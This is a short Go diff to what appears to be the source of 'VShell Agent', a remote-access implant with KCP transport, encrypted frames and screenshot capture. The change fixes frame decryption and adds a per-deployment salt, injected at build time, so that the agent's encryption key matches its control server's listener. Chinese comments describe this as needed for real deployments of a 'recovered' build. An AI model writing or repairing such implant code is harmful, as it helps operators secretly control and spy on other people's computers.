@@ -448,7 +448,8 @@ func (t *kcpTransport) readFrame() (byte, []byte, error) {
 		if data[0] == linkMsgHealth {
 			continue
 		}
-		pt, err := decryptFrame(data[1:])
+		// data[1:] 是带 <u32 LE len> 头的线消息，必须先剥头再解帧。
+		pt, err := decryptWire(data[1:])
 		if err != nil {
 			return 0, nil, err
 		}
@@ -2963,6 +2964,12 @@ func linuxScreenshot() (string, string) {
 func main() {
 	log.Printf("VShell Agent v%s starting (%s/%s)", agentVersion, runtime.GOOS, runtime.GOARCH)
 	log.Printf("Host: %s, User: %s, PID: %d", hostname, username, pid)
+
+	// 消息帧密钥 = md5(本次部署的盐)。默认常量只是"被恢复的那次部署"的取值，
+	// 实际部署必须用 ldflags 注入的 EncryptSalt 覆盖，否则服务端（按监听器
+	// EncryptSalt 派生）与 agent 的帧密钥不同，帧解不开 —— 见 docs/PROTOCOL.md。
+	SetMsgFrameSalt(EncryptSalt)
+	log.Printf("Frame salt: %q (key %s)", CurrentFrameSalt(), msgFrameKeyText())
 
 	// Parse transport mode from server address
 	mode := "http"
